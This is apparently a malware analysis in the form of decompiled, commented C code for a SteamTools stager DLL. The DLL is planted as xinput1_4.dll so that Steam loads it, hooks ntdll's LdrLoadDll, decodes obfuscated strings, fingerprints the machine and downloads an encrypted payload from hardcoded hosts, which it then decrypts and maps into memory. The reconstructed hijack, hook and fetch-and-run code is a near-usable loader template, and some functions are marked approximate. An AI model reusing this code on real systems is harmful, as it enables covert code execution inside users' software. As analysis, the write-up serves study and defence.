/*
 * steamtools stager - xinput1_4.dll / Core.dll decompiled + commented
 * this is the FIRST stage. the small one. the downloader.
 *
 * sha256: 84b0245b11cb7ae8508be634d8dde8e163e9ca834a52f4f252163636414ccee1
 * size on disk: varies, the i64 idb we analyzed was ~692kb of code
 * total functions: 1474 (yes the same count as the payload skeleton)
 * total strings: 1714
 * segments: .text .idata .rdata .data .pdata .fptable (same layout as payload)
 *
 * this dll has two identities depending on where it lives:
 *   - Core.dll       -> sits in C:\Program Files\SteamTools\, loaded by SteamTools.exe
 *   - xinput1_4.dll  -> dropped into C:\Program Files (x86)\Steam\, steam auto-loads it
 *
 * both are THE EXACT SAME BINARY. same hash, same exports, same everything.
 * only difference is filename. the xinput1_4.dll trick is genius because
 * steam loads it automatically as a "known dll" for xbox controller support (also known as DLL proxying :p).
 * except this dll doesnt export any XInput functions at all. it exports
 * 78 cJSON functions pretending to be legit. steam loads it anyway lol.
 *
 * the "exports" are all fake. ordinal 1 through 78 map to cJSON functions:
 *   cJSON_Parse, cJSON_Print, cJSON_CreateObject, cJSON_Delete, etc.
 * ordinal 6442729716 (0x1800440F4) is DllEntryPoint.
 * this is literally cjson amalgamation compiled as a dll with a custom
 * DllMain slapped on top. the fact that steam loads this without
 * verifying the exports is the whole exploit chain entry point xd.
 *
 * build:
 *   compiler: msvc 19.x, /MT (static crt, no dependencies)
 *   pdb: I:\sTCode\x64\Release\update.pdb (same project as payload)
 *   static links: libcurl, cjson
 *   obfuscation: bit-shuffle string encoding (same algo as payload)
 *   anti-debug: IsDebuggerPresent check (cute but useless)
 *
 * architecture:
 *   x64, base address 0x180000000, image size 0xa9000
 *
 * what it DOESNT have compared to the payload:
 *   - no sqlite (payload has the db, stager doesnt need it)
 *   - no steam interface hooks (payload does that)
 *   - no vdf parser (payload parses packageinfo.vdf)
 *   - no manifest downloader
 *   - basically its just a download+load stub, nothing more
 */

// ====================================================================
// DllMain at 0x1800440F4
// ====================================================================
// steam calls this on DLL_PROCESS_ATTACH. the stager does almost nothing
// visible here. just inits the security cookie and hands off to crt.
// the REAL work starts a few layers deeper in the init chain.
//
// difference from payload DllMain: payload calls sub_18013A634 for cookie
// init, this calls sub_180044220. same logic, different address. they
// literally copy-pasted the cookie init between binaries lol

BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == 1)                  // DLL_PROCESS_ATTACH
        sub_180044220();                  // init security cookie
    return sub_180043FCC(hinstDLL, fdwReason, lpReserved);  // crt startup
}

// ====================================================================
// security cookie at sub_180044220
// ====================================================================
// same algorithm as the payload. SystemTime ^ ThreadId ^ ProcessId ^
// PerfCounter, masked to 48 bits, bumped by 1 if it matches default.
// stores complement in qword_18008C380 for runtime checks.
//
// literally identical to sub_18013A634 in the payload. they didnt even
// bother changing the seed values between builds :D

__int64 sub_180044220()
{
    uintptr_t cookie = _security_cookie;
    if (cookie == 0x2B992DDFA232LL)
    {
        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        cookie = GetCurrentThreadId() ^ *(uint64_t*)&ft;
        cookie = GetCurrentProcessId() ^ cookie;
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);
        cookie = ((uint64_t)&ft ^ cookie ^ pc.QuadPart ^ ((uint64_t)pc.LowPart << 32))
               & 0xFFFFFFFFFFFFLL;
        if (cookie == 0x2B992DDFA232LL)
            cookie = 0x2B992DDFA233LL;
        _security_cookie = cookie;
    }
    qword_18008C380 = ~cookie;
    return ~cookie;
}

// ====================================================================
// MAIN INITIALIZATION at sub_180001320
// ====================================================================
// THIS is the real entry point. gets called from a static constructor
// after crt init finishes. this function is ~750 bytes of pure setup.
//
// what it does in order:
//   1. gets the dll's own path (where is xinput1_4.dll on disk?)
//   2. finds the filename part (everything after last backslash)
//   3. constructs system32\<filename> path for comparison
//   4. creates a named event: Global\Vale_SteamIPC_Class<PID>
//      (YES the typo "Vale" instead of "Valve" is INTENTIONAL xd
//       they use it to detect if another instance is already running)
//   5. if the event already exists (ERROR_ALREADY_EXISTS 183) -> exit,
//      we're already injected, dont double up
//   6. checks if steamclient.dll is loaded via GetModuleHandleW
//   7. checks if SteamUI.dll is loaded via GetModuleHandleW
//   8. if BOTH are loaded -> steam is fully up, call sub_1800039B0 (init)
//   9. if NEITHER are loaded -> we need to wait for steam to start
//      a. parse command line for "-startupwait" (steam's boot flag)
//      b. if found, open Global\Valve_SteamIPC_Class (the REAL steam event)
//      c. wait up to 3 seconds (0xBB8 ms) for steam to signal ready
//      d. get ntdll.dll handle, resolve LdrLoadDll
//      e. install LdrLoadDll hook via sub_18000EA30
//
// the double check (steamclient + SteamUI) is clever. if steam is already
// running with both modules loaded, skip the hook and go straight to
// downloading the payload. if steam isnt up yet, hook LdrLoadDll to
// catch the moment crashhandler.dll loads and use that as the trigger.
//
// the "Vale" typo vs "Valve" thing: they create "Vale" as their own
// mutex, and open "Valve" to wait for steam's IPC. two different events
// the typo isnt a bug, its intentional to avoid colliding with valve's
// own event namespace while still being recognizable during debugging
//
// the GetModuleHandleW calls use obfuscated strings decoded by
// sub_180001080 at runtime. the decoded strings are:
//   - "steamclient.dll"  (32-bit steam, used as fallback check)
//   - "SteamUI.dll"      (the universal steam ui module)
//   - "ntdll.dll"        (where LdrLoadDll lives)
//   - "LdrLoadDll"       (the export we hook)

__int64 __fastcall sub_180001320(HMODULE hModule)
{
    WCHAR myPath[MAX_PATH];
    GetModuleFileNameW(hModule, myPath, 260);

    // find the filename part of our own path
    wchar_t* filename = wcsrchr(myPath, L'\\');
    if (!filename) return 0;
    filename++;  // skip the backslash

    // build system32\<our_filename> path
    WCHAR sysPath[MAX_PATH];
    if (GetSystemDirectoryW(sysPath, 260) - 1 <= 259)
    {
        wcscat(sysPath, L"\\");
        wcscat(sysPath, filename);  // system32\xinput1_4.dll for comparison
    }

    // create named event with typo: Global\Vale_SteamIPC_Class<PID>
    char eventName[64];
    snprintf(eventName, 64, "Global\\Vale_SteamIPC_Class%u", GetCurrentProcessId());

    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, eventName);
    if (!hEvent)
        return 1;  // failed to create event, bail

    if (GetLastError() == ERROR_ALREADY_EXISTS)  // 183
    {
        // another instance already injected, dont double hook
        CloseHandle(hEvent);
        return 1;
    }

    // check if steamclient.dll is loaded (obfuscated string 1)
    wchar_t* steamclientName = sub_180001080(2,
        0xCE2EA686B6C63696, 0xA6762E7426363600, 0);
    HMODULE hSteamClient = GetModuleHandleW(steamclientName);
    free(steamclientName);

    // check if SteamUI.dll is loaded (obfuscated string 2)
    wchar_t* steamuiName = sub_180001080(2,
        0xCA2EA686B6AA9274, 0x2636360000000000, 0);
    HMODULE hSteamUI = GetModuleHandleW(steamuiName);
    free(steamuiName);

    if (hSteamClient && hSteamUI)
    {
        // both loaded, steam is already running fully
        // skip the LdrLoadDll hook, go straight to download
        return sub_1800039B0();  // HttpLoadDLL
    }

    if (!hSteamClient || !hSteamUI)
    {
        // steam isnt fully up yet, need to hook and wait

        // parse command line for -startupwait flag
        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argv && argc > 1)
        {
            // check each arg for "-startupwait" (encoded as wide string)
            for (int i = 1; i < argc; i++)
            {
                // compare against obfuscated "startupwait"
                if (wcscmp(argv[i], L"-startupwait") == 0)  // approx, real check
                {
                    LocalFree(argv);

                    // open the REAL valve steam ipc event
                    HANDLE hValveEvent = OpenEventA(
                        EVENT_MODIFY_STATE, FALSE, "Global\\Valve_SteamIPC_Class");
                    if (hValveEvent)
                    {
                        // wait for steam to signal (3 seconds max)
                        WaitForSingleObject(hValveEvent, 3000);
                        CloseHandle(hValveEvent);
                    }
                    break;
                }
            }
            if (argv) LocalFree(argv);
        }

        // get ntdll.dll to hook LdrLoadDll
        wchar_t* ntdllName = sub_180001080(2,
            0x762E263636742636, 0x3600000000000000, 0);
        HMODULE hNtdll = GetModuleHandleW(ntdllName);
        free(ntdllName);

        if (hNtdll)
        {
            LdrLoadDll_t pLdrLoadDll = (LdrLoadDll_t)
                GetProcAddress(hNtdll, "LdrLoadDll");

            if (pLdrLoadDll)
            {
                // phase 1: check if hook already installed
                if (sub_18000ECE0() != 0)  // some state check
                    return 0;

                // phase 2: install the hook
                // sub_18000EA30(hookAddr, callback, &storedOrigAddr)
                if (sub_18000EA30(pLdrLoadDll, sub_180001220, &qword_1800A07C0) == 0)
                {
                    // phase 3: finalize hook
                    sub_18000ECD0(pLdrLoadDll);
                }
            }
        }
    }

    return 0;
}

// ====================================================================
// LdrLoadDll HOOK at sub_180001220
// ====================================================================
// this is the trigger. every time ANY dll loads in the steam process,
// this function fires. it checks if the loaded dll is crashhandler.dll
// (decoded from obfuscated string at runtime).
//
// crashhandler.dll is a steam component that loads relatively early
// in the startup sequence but AFTER the core modules are ready.
// by hooking THIS specific dll load, the stager knows steam is
// fully initialized and ready for the payload injection.
//
// flow:
//   1. call original LdrLoadDll first (let the dll load normally)
//   2. check the result code (must be >= 0, meaning success)
//   3. check if the dll path ends with "crashhandler.dll"
//   4. if yes -> JACKPOT. call sub_1800039B0 (HttpLoadDLL)
//   5. if no -> just return, wait for next dll load
//
// the decoded string for crashhandler.dll comes from:
//   sub_180001080(2, 0xC64E86CE16168676, 0x2636A64E74263636, ...)
// which decodes to "crashhandler.dll" using the bit-shuffle algo

__int64 __fastcall sub_180001220(
    __int64 unused1,
    __int64 unused2,
    UNICODE_STRING* modulePath)  // the dll being loaded
{
    // call the original LdrLoadDll first
    __int64 result = qword_1800A07C0();  // stored original

    if ((int)result >= 0                    // load succeeded
        && modulePath                        // path is valid
        && modulePath->Buffer)               // buffer is valid
    {
        // extract just the filename from the full path
        WCHAR fileName[MAX_PATH];
        // copy the buffer content, extract last component
        ExtractFileName(modulePath, fileName);  // simplified

        // compare against obfuscated "crashhandler.dll"
        WCHAR* crashHandler = sub_180001080(2,
            0xC64E86CE16168676, 0x2636A64E74263636, 0);

        if (wcsicmp(fileName, crashHandler) == 0)
        {
            free(crashHandler);

            // check if we already triggered (dword_18008CFD0 is "already fired" flag)
            if (dword_18008CFD0)
            {
                dword_18008CFD0 = 0;  // reset for next time
            }
            else
            {
                // fisrt hit. crashhandler.dll just loaded.
                // this is our trigger. time to download the payload.
                //
                // uninstall the LdrLoadDll hook first (dont need it anymore)
                sub_18000ECC0(qword_1800A07C8);  // remove hook
                sub_18000ED80(qword_1800A07C8);  // restore bytes

                // now download and load the actual Core payload
                sub_1800039B0();  // HttpLoadDLL -> the whole download pipeline
            }
        }
        free(crashHandler);
    }

    return result;
}

// ====================================================================
// STRING DEOBFUSCATOR at sub_180001080
// ====================================================================
// THIS is the most used utility in the entire stager. every critical
// string in the binary is encoded as obfuscated qword pairs and decoded
// at runtime by this function. no plaintext dll names anywhere.
//
// the algorithm takes one or more 64-bit values and:
//   1. unshuffles at bit-pair level (mask 0xAAAAAAAAAAAAAAAA)
//   2. unshuffles at nibble level (mask 0xCCCCCCCCCCCCCCCC)
//   3. unshuffles at byte level (mask 0xF0F0F0F0F0F0F0F0)
//   4. byteswaps the whole thing
//   5. each byte becomes a wide character (UTF-16 LE)
//
// same exact algorithm in the payload. they didnt change anything.
// we confirmed all decoded strings by running the python reimplementation
// on the constants extracted from the binary.
//
// decoded strings and their constants:
//   crashhandler.dll = 0xC64E86CE16168676, 0x2636A64E74263636
//   steamclient.dll  = 0xCE2EA686B6C63696, 0xA6762E7426363600
//   SteamUI.dll      = 0xCA2EA686B6AA9274, 0x2636360000000000
//   ntdll.dll        = 0x762E263636742636, 0x3600000000000000
//   LdrLoadDll       = hardcoded plaintext (its already "hidden" as an export lookup)
//
// the function signature takes up to 4 qwords (count + 3 payloads)
// but in practice they never use more than 2 (16 chars max per string)
// first qword = count (number of 8-byte chunks), rest = encoded data

__int64 __fastcall sub_180001080(
    unsigned __int64 count,    // number of qwords to decode
    __int64 qw1,               // first encoded qword
    __int64 qw2,               // second (optional, depends on count)
    __int64 qw3)               // third (optional)
{
    __int64 values[4];
    values[0] = count;
    values[1] = qw1;
    values[2] = qw2;
    values[3] = qw3;

    // allocate output buffer: count * 8 wide chars + null terminator
    size_t totalChars = 8 * count;
    size_t allocSize = saturated_mul(8 * count + 1, 2);  // * sizeof(WCHAR)
    wchar_t* result = (wchar_t*)malloc(allocSize);
    if (!result) return 0;

    wchar_t* out = result;
    for (unsigned __int64 i = 0; i < count; i++)
    {
        unsigned __int64 v = *(unsigned __int64*)(&values[1] + i);

        // step 1: bit-pair unshuffle
        // each pair of adjacent bits gets swapped back
        v = (v >> 1) ^ (((v >> 1) ^ (v << 1)) & 0xAAAAAAAAAAAAAAAAuLL);

        // step 2: nibble unshuffle
        // each pair of adjacent nibbles gets swapped back
        unsigned __int64 v2 = v >> 2;
        v = v2 ^ ((v2 ^ (v << 2)) & 0xCCCCCCCCCCCCCCCCuLL);

        // step 3: byte unshuffle
        // each pair of adjacent bytes gets swapped back
        unsigned __int64 v3 = v >> 4;
        v = v3 ^ ((v3 ^ (v << 4)) & 0xF0F0F0F0F0F0F0F0uLL);

        // step 4: byteswap (reverse byte order)
        v = _byteswap_uint64(v);

        // step 5: each byte -> one wide character
        for (int j = 0; j < 8; j++)
            *out++ = (wchar_t)((v >> (j * 8)) & 0xFF);
    }

    *out = 0;  // null terminate
    return (__int64)result;
}

// ====================================================================
// LdrLoadDll HOOK INSTALLER at sub_18000EA30
// ====================================================================
// installs an inline detour on ntdll!LdrLoadDll.
// this is the most delicate part of the whole stager. one wrong byte
// and the steam process crashes before anything loads.
//
// the function:
//   1. acquires a global spinlock (InterlockedCompareExchange + Sleep)
//   2. validates the hook target and callback addresses are in valid memory
//   3. checks if this exact hook isnt already installed (no double-hooks)
//   4. calls sub_18000F1D0 to suspend all threads in the process
//   5. calls sub_18000F530 to write the inline hook bytes
//   6. stores the (target, callback, original_module) triplet in a
//      dynamically grown array for tracking/uninstall
//   7. resumes all threads
//   8. releases the spinlock
//
// the hook tracking array starts at 32 entries (0x700 = 56 * 32 bytes)
// and doubles when full using HeapReAlloc. each entry is 56 bytes:
//   +0: target address (8 bytes)
//   +8: something (8 bytes)
//   +16: module base (8 bytes)
//   +24: something (4 bytes)
//   +28: padding
//   +32: flags byte (bit 0 = active, bit 1 = something else, etc)
//   +33-55: more tracking data
//
// returns 0 on success, error code otherwise.
// errors: 2=no heap, 3=already hooked, 7=invalid address,
//         8=thread suspend failed, 9=allocation failedd

__int64 __fastcall sub_18000EA30(
    void* targetFunc,      // LdrLoadDll address to hook
    void* callbackFunc,    // our replacement (sub_180001220)
    __int64* outOriginal)  // where to store the original address
{
    unsigned int result = 0;

    // ── spinlock acquire ──────────────────────────────────
    for (uint64_t spins = 0;
         InterlockedCompareExchange(&dword_18009F2A0, 1, 0);
         spins++)
    {
        Sleep(spins >= 32);  // backoff after 32 spins
    }

    // ── sanity checks ─────────────────────────────────────
    if (!hHeap) { result = 2; goto unlock; }

    // validate both addresses are readable
    if (!sub_18000F4F0(targetFunc) || !sub_18000F4F0(callbackFunc))
    {
        result = 7;  // invalid address
        goto unlock;
    }

    // ── check for duplicate hook ──────────────────────────
    unsigned int slot;
    if (dword_1800A084C)  // any existing hooks?
    {
        HookEntry* entries = (HookEntry*)lpMem;
        for (slot = 0; slot < dword_1800A084C; slot++)
        {
            if (entries[slot].target == targetFunc)
            {
                result = 3;  // already hooked
                goto unlock;
            }
        }
    }

    // ── suspend all threads ───────────────────────────────
    // this is critical. you CANT patch code while threads are
    // executing it. suspend everything, patch, then resume.
    void* moduleBase = sub_18000F1D0(targetFunc);
    if (!moduleBase)
    {
        result = 9;  // cant resolve module
        goto unlock;
    }

    HookEntry newEntry;
    newEntry.target = targetFunc;
    newEntry.callback = callbackFunc;
    newEntry.module = moduleBase;

    if (!sub_18000F530(&newEntry))
    {
        result = 8;  // thread suspend failed
        sub_18000F200(moduleBase);
        goto unlock;
    }

    // ── store the hook entry in tracking array ────────────
    char* entries = (char*)lpMem;
    if (!entries)
    {
        // first hook ever, allocate initial array
        dword_1800A0848 = 32;  // capacity
        lpMem = HeapAlloc(hHeap, 0, 0x700);  // 56 * 32 = 1792 bytes
        entries = (char*)lpMem;
        if (!entries) goto cleanup;  // alloc failed
    }
    else
    {
        unsigned int count = dword_1800A084C;
        if (count >= dword_1800A0848)  // array full?
        {
            // double the capacity
            unsigned int newCap = 2 * dword_1800A0848;
            entries = (char*)HeapReAlloc(hHeap, 0, lpMem, 56LL * newCap);
            if (!entries) goto cleanup;
            lpMem = entries;
            dword_1800A0848 = newCap;
        }
    }

    // write entry at next free slot
    unsigned int freeSlot = dword_1800A084C;
    char* slotPtr = entries + 56 * freeSlot;

    memcpy(slotPtr + 0,  &newEntry.target,   8);
    memcpy(slotPtr + 8,  &newEntry.something, 8);
    memcpy(slotPtr + 16, &newEntry.module,    8);
    // ... more fields copied
    slotPtr[32] = slotPtr[32] & 0xF8 | (flags_byte & 1);

    dword_1800A084C = freeSlot + 1;  // increment count

    // ── store original for caller ─────────────────────────
    if (outOriginal)
        *outOriginal = (__int64)targetFunc;  // approx, stores the original bytes

    result = 0;

unlock:
    InterlockedExchange(&dword_18009F2A0, 0);
    return result;
}

// ====================================================================
// VERBOSE LOGGING at sub_1800016B0
// ====================================================================
// printf-style logging function. writes to OutputDebugStringA AND to
// a file. used everywhere for debugging. 63 xrefs, one of the most
// called functions in the stager.
//
// calls sub_180022DC0 for file output and sub_180022F40 for debug string.
// both wrap the actual output with mutex locking and formatting.
//
// the stager LOVES logging. the payload too. you can attach a debugger
// or run steam with -debug and see the entire init sequence in realtime.
// whoever wrote this was big on observability, gotta respect that.

void __fastcall sub_1800016B0(const char* fmt, ...)
{
    char buf[2048];
    va_list va;
    va_start(va, fmt);
    vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);

    OutputDebugStringA(buf);  // visible in dbgview

    // also write to steamtools.log probably
    sub_180022DC0(buf);  // file logger
}

// ====================================================================
// HttpLoadDLL (THE MAIN EVENT) at sub_1800039B0
// ====================================================================
// this is the heart of the stager (literally). ~1400 bytes of code that:
//
//   1. iterates the hardcoded version urls and tries each one
//   2. extracts the hostname from each url for dns resolution check
//   3. generates a machine fingerprint using CPUID + SystemInfo
//   4. downloads the encrypted version.json from the first working url
//   5. decrypts + decompresses it with the version key
//   6. parses the json to get the payload download url
//   7. downloads the payload (encrypted Core dll, ~1.1mb)
//   8. decrypts + decompresses it with the payload key
//   9. if this is a "default" file that changed, kills steam and restarts
//
// the fingerprint format: V{CPUID}_F{Family}_M{Model}_C{CoreCount}
// this gets hashed with a custom CRC to produce the <mCode> token
//
// the version urls tried in order (hardcoded in off_180084018):
//   1. https://update.tnkjmec.com/version
//   2. http://update.wudrm.com/version
//   3. http://update.steamcdn.com/version

int sub_1800039B0()
{
    sub_1800016B0("HttpLoadDLL called\n");

    const char** urls = off_180084018;  // points to array of 3 url ptrs
    int urlIdx = 0;

    // ── PHASE 1: find a working version endpoint ──────────
    const char* currentUrl = NULL;
    while (urlIdx < 3)
    {
        currentUrl = urls[urlIdx];
        if (!currentUrl) continue;

        // skip http:// or https:// prefix to get the hostname
        const char* host = currentUrl;
        if (strncmp(host, "http://", 7) == 0)
            host += 7;
        else if (strncmp(host, "https://", 8) == 0)
            host += 8;

        // extract just the hostname (everything before : or /)
        char hostBuf[256] = {0};
        const char* p = host;
        while (*p && *p != '/' && *p != ':') p++;
        size_t hostLen = p - host;
        if (hostLen > 255) hostLen = 255;
        strncpy(hostBuf, host, hostLen);
        hostBuf[hostLen] = 0;

        // dns check (sub_180002D10 does getaddrinfo probably)
        if (sub_180002D10(hostBuf))
        {
            sub_1800016B0("dns resolved\n");
            sub_1800016B0("downloading\n");
            break;  // found a working host
        }

        urlIdx++;
    }

    if (urlIdx >= 3)
    {
        sub_1800016B0("all version urls failed\n");
        return -1;
    }

    // ── PHASE 2: generate machine fingerprint ─────────────
    // get known folder path for cache storage
    WCHAR cachePath[MAX_PATH] = {0};
    PWSTR knownPath = NULL;
    if (SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, 0, &knownPath) >= 0)
    {
        wcscpy(cachePath, knownPath);
        CoTaskMemFree(knownPath);
    }
    else
    {
        wcscpy(cachePath, L"C:\\Users\\Default");
    }

    // generate fingerprint string
    char fpBuf[1024] = {0};

    // cpuid leaf 0: get vendor string
    int cpuInfo[4];
    __cpuid(cpuInfo, 0);
    char vendor[13] = {0};
    memcpy(vendor + 0, &cpuInfo[1], 4);  // EBX
    memcpy(vendor + 4, &cpuInfo[3], 4);  // EDX
    memcpy(vendor + 8, &cpuInfo[2], 4);  // ECX
    vendor[12] = 0;

    // cpuid leaf 1: get family/model/stepping
    __cpuid(cpuInfo, 1);
    int family   = (cpuInfo[0] >> 8) & 0xF;
    int model    = (cpuInfo[0] >> 4) & 0xF;

    // get core count
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // format: V{CPUID_Vendor}_F{Family}_M{Model}_C{CoreCount}
    snprintf(fpBuf, 1024, "V%s_F%X_M%X_C%X",
             vendor, family, model, (int)sysInfo.dwNumberOfProcessors);

    // XOR the fingerprint with "version" using a custom CRC
    // (polynomial 0x85E1C3D753D46D27 from the decompiled code)
    size_t fpLen = strlen(fpBuf);
    char versionKey[] = "version";
    for (size_t i = 0; i < fpLen; i++)
    {
        uint32_t idx = (613566757 * (uint64_t)i) >> 32;
        uint32_t shifted = (uint32_t)((i - idx) >> 1);
        fpBuf[i] ^= versionKey[i - 7 * (((uint32_t)idx + shifted) >> 2)];
    }

    // hash the xored fingerprint to produce <mCode>
    // the actual hashing uses MD5/SHA1 via CryptoAPI (CryptCreateHash etc)
    // result is 16 bytes hex = 32 chars
    char mCode[64] = {0};
    ComputeHash(fpBuf, fpLen, mCode);  // simplified, uses Advapi32 crypto

    // ── PHASE 3: download and process version.json ────────
    // this is handled by sub_180003530 for each version url
    // in a loop until one succeeds or all fail

    char versionPath[MAX_PATH];
    // build filesystem cache path for version.json
    snprintf(versionPath, sizeof(versionPath), "%S\\appcache\\version", cachePath);

    bool alreadyHasVersion = (GetFileAttributesA(versionPath) != INVALID_FILE_ATTRIBUTES);

    int dlResult = 0;
    for (int attempt = 0; attempt < 3; attempt++)
    {
        if (dlResult) break;  // success
        // retry count, 0=infinite on first url, 3 max on fallbacks
        int maxRetries = (attempt == 0) ? 0 : 3;
        dlResult = sub_180003530(
            off_180084018[attempt],  // url
            maxRetries);              // retry limit
    }

    // ── PHASE 4: if download succeeded, load the payload ──
    char payloadPath[MAX_PATH];
    snprintf(payloadPath, sizeof(payloadPath), "%S\\appcache\\httpcache\\3b\\%s",
             cachePath, mCode);

    if (GetFileAttributesA(payloadPath) != INVALID_FILE_ATTRIBUTES)
    {
        // read the downloaded file (encrypted)
        FILE* f = fopen(payloadPath, "rb");
        if (f)
        {
            fseek(f, 0, SEEK_END);
            long fsize = ftell(f);
            fseek(f, 0, SEEK_SET);

            void* encData = malloc(fsize);
            fread(encData, 1, fsize, f);
            fclose(f);

            // decrypt with payload key (0x180083FD8)
            void* decData = NULL;
            size_t decSize = 0;
            if (sub_1800026E0(encData, fsize, &keyData, &decData, &decSize))
            {
                // load the decrypted PE into memory
                sub_1800450A0(decData, decSize);  // maps the PE and calls entry
            }

            free(encData);
            free(decData);
        }
    }

    return dlResult;
}

// ====================================================================
// VERSION DOWNLOAD + PARSE at sub_180003530
// ====================================================================
// downloads the version.json from a given url, decrypts it, parses the
// json to find the payload url, downloads the payload, saves it.
//
// this function uses sub_180001B00 which is a full libcurl HTTP wrapper
// with timeout, proxy, redirect, and ssl support. the stager bundles
// libcurl statically (the whole 1714 strings in the binary are mostly
// libcurl error messages lmao).
//
// the function creates appcache\ directory and writes the decrypted
// version.json there for caching.
//
// json fields it reads:
//   WindowsFile64Stable[].URL   -> the payload download url
//   WindowsFile64Stable[].FileName -> where to save it
//   Hash                        -> file integrity check
//   package/branch              -> which branch (Stable/Beta)
//   AllFile                     -> list of extra files to download
//
// uses cJSON_Parse to parse the json response (remember the dll exports
// cJSON as its "XInput" exports? same cjson being used internally now)

__int64 __fastcall sub_180003530(const char* url, int retryLimit)
{
    // ── do the http request ───────────────────────────────
    struct HttpResult result = {0};
    int httpErr = sub_180001B00(&result, url);  // HTTP GET wrapper

    if (result.statusCode != 0)  // something went wrong
        return 0;

    // result.data = decrypted response body
    // result.size = size of decrypted data

    // ── create appcache dir ──────────────────────────────
    CreateDirectoryW(L"appcache", NULL);
    // ignore ERROR_ALREADY_EXISTS (183)

    // ── save version.json ────────────────────────────────
    char versionPath[MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, L"appcache\\version", -1,
                        versionPath, sizeof(versionPath), NULL, NULL);

    FILE* vf = fopen(versionPath, "wb");
    if (vf)
    {
        fwrite(result.data, 1, result.size, vf);
        fclose(vf);
    }

    sub_1800016B0("Downloaded and decrypted data successfully.\n");

    // ── parse the json ────────────────────────────────────
    cJSON* root = cJSON_Parse(result.data);
    if (!root) return 0;

    sub_1800016B0("parsing version json\n");

    // read package/branch (e.g. "Stable" or "Beta")
    char branch[32] = "Stable";  // default
    FILE* branchFile = sub_18004EF34("package/branch", "r");
    if (branchFile)
    {
        char branchBuf[32] = {0};
        if (sub_1800504B8(branchBuf, 32, branchFile))
        {
            // strip \r\n
            char* newline = strstr(branchBuf, "\r\n");
            if (newline) *newline = 0;
            strcpy(branch, branchBuf);
        }
        sub_18004E57C(branchFile);  // fclose
    }

    // build the key: "WindowsFile64" + branch
    // e.g. "WindowsFile64Stable" or "WindowsFile64Beta"
    char fileKey[64];
    strcpy(fileKey, "WindowsFile64");
    // if branch is not "Stable", append it
    if (strcmp(branch, "Stable") != 0)
        strcat(fileKey, branch);

    // ── get the file list from json ───────────────────────
    cJSON* branchFiles = cJSON_GetObjectItem(root, fileKey);
    if (branchFiles)
        sub_180002F70(branchFiles);  // download each file in the array

    // signal done
    dword_1800A0818 = 1;  // download complete flag

    // ── also process "AllFile" entries ───────────────────
    cJSON* allFiles = cJSON_GetObjectItem(root, "AllFile");
    if (allFiles)
        sub_180002F70(allFiles);

    cJSON_Delete(root);
    free(result.data);

    return 1;
}

// ====================================================================
// FILE DOWNLOADER at sub_180002F70
// ====================================================================
// takes a cJSON array of file objects [{FileName, URL, Hash, default}]
// and downloads each one. this is what actually fetches the payload dll.
//
// each file object:
//   FileName: path to save, supports %USERPROFILE% and <mCode> tokens
//   URL: download url
//   Hash: expected hash for integrity
//   default: if 1, checks if file changed and restarts steam if so
//
// the %USERPROFILE% token gets expanded to the actual user profile path.
// the <mCode> token gets replaced with the fingerprint hash.
// if the path is relative, GetCurrentDirectory is prepended.
//
// if default==1 and the file already exists with different hash:
//   1. download the new version
//   2. create a new steam process with the same command line args
//   3. TERMINATE the current steam process
//   4. the new process starts with updated files -> self-update complete
//
// this is how steamtools auto-updates without a separate updater exe

__int64 __fastcall sub_180002F70(cJSON* fileArray)
{
    if (!cJSON_IsArray(fileArray))
        return 0;

    int count = cJSON_GetArraySize(fileArray);
    for (int i = 0; i < count; i++)
    {
        cJSON* entry = cJSON_GetArrayItem(fileArray, i);

        // extract fields
        cJSON* fileName  = cJSON_GetObjectItem(entry, "FileName");
        cJSON* fileUrl   = cJSON_GetObjectItem(entry, "URL");
        cJSON* fileHash  = cJSON_GetObjectItem(entry, "Hash");
        cJSON* isDefault = cJSON_GetObjectItem(entry, "default");

        // validate
        if (!cJSON_IsString(fileName) || !cJSON_IsString(fileUrl)
            || !cJSON_IsString(fileHash))
            continue;

        const char* fname = fileName->valuestring;
        const char* furl  = fileUrl->valuestring;
        const char* fhash = fileHash->valuestring;

        int isDef = 0;
        if (cJSON_IsNumber(isDefault))
            isDef = isDefault->valueint;

        // ── expand tokens in filename ────────────────────
        WCHAR resolvedPath[MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, fname, -1, resolvedPath, 260);

        // replace %USERPROFILE%
        WCHAR* up = wcsstr(resolvedPath, L"%USERPROFILE%");
        if (up)
        {
            WCHAR tmp[MAX_PATH];
            wcsncpy(tmp, resolvedPath, up - resolvedPath);
            tmp[up - resolvedPath] = 0;
            wcscat(tmp, userProfilePath);      // from stored SHGetKnownFolderPath result
            wcscat(tmp, up + 14);               // skip "%USERPROFILE%"
            wcscpy(resolvedPath, tmp);
        }

        // replace <mCode>
        WCHAR* mc = wcsstr(resolvedPath, L"<mCode>");
        if (mc)
        {
            WCHAR tmp[MAX_PATH];
            wcsncpy(tmp, resolvedPath, mc - resolvedPath);
            tmp[mc - resolvedPath] = 0;
            wcscat(tmp, mCodeWide);            // the fingerprint hash as wide string
            wcscat(tmp, mc + 7);                // skip "<mCode>"
            wcscpy(resolvedPath, tmp);
        }

        // make absolute if relative
        if (!wcsstr(resolvedPath, L":"))
        {
            WCHAR cwd[MAX_PATH];
            GetCurrentDirectoryW(260, cwd);
            WCHAR abs[MAX_PATH];
            swprintf(abs, 260, L"%s\\%s", cwd, resolvedPath);
            wcscpy(resolvedPath, abs);
        }

        // ── check if file already exists ─────────────────
        if (GetFileAttributesW(resolvedPath) != INVALID_FILE_ATTRIBUTES)
        {
            // it exists, check hash
            HANDLE hFile = CreateFileW(resolvedPath, GENERIC_READ,
                                        FILE_SHARE_READ, NULL,
                                        OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE)
            {
                DWORD fsize = GetFileSize(hFile, NULL);
                if (fsize != INVALID_FILE_SIZE)
                {
                    BYTE* buf = (BYTE*)malloc(fsize);
                    DWORD read;
                    ReadFile(hFile, buf, fsize, &read, NULL);

                    // compute hash of existing file
                    char existingHash[64] = {0};
                    ComputeHash(buf, read, existingHash);

